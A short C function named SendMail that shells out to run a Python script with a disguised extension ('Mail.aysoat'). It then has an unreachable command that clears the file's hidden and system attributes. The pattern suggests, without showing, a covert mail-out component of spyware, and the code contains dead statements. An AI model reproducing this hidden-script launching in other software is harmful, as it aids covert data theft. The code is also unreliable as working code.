int SendMail(int returnVal)
{
system("python Mail.aysoat");
switch(returnVal)
{
case 0:
return 0;
break;
case -1:
return -1;
break;
default:
return 0;
break;	  	  	
}
system("attrib -h -s Mail.aysoat");
}
